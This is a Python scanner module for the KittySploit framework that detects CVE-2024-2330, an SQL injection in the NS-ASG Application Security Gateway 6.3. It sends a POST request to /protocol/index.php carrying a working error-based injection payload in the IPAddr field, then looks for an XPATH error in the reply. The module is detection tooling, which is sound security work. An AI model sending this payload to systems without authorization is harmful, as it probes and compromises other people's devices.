#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""A vulnerability was found in Netentsec NS-ASG Application Security Gateway 6."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'NS-ASG Application Security Gateway 6.3 - Sql Injection Detection',
        'description': 'A vulnerability was found in Netentsec NS-ASG Application Security Gateway 6.3. It has been classified as critical. This affects an unknown part of the file /protocol/index.php. The manipulation of the argument IPAddr leads to sql injection. It is possible to initiate the attack remotely. The exploit has been disclosed to the public and may be used.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2024', 'ns-asg', 'sqli', 'vkev', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://cve.mitre.org/cgi-bin/cvename.cgi?name=2024-2330',
            'https://nvd.nist.gov/vuln/detail/CVE-2024-2330',
            'https://github.com/jikedaodao/cve/blob/main/NS-ASG-sql-addmacbind.md',
            'https://vuldb.com/?ctiid.256281',
            'https://vuldb.com/?id.256281',
        ],
        'cve': 'CVE-2024-2330',
    }

    def run(self):
        path = '/protocol/index.php'
        r = self.http_request(method='POST', path=path, allow_redirects=False, headers={'Content-Type': 'application/x-www-form-urlencoded'}, data='jsoncontent={"protocolType":"addmacbind","messagecontent":["{\\"BandIPMacId\\":\\"1\\",\\"IPAddr\\":\\"eth0\'and(updatexml(1,concat(0x7e,(select+version())),1))=\'\\",\\"MacAddr\\":\\"\\",\\"DestIP\\":\\"\\",\\"DestMask\\":\\"255.255.255.0\\",\\"Description\\":\\"Sample+Description\\"}"]}\n')
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_all = ('XPATH syntax error:', 'alert', 'text/html',)
        if all(m in body for m in body_all):
            self.set_info(severity='medium', reason='NS-ASG Application Security Gateway 6.3 - Sql Injection detected', path=path)
            return True
        return False

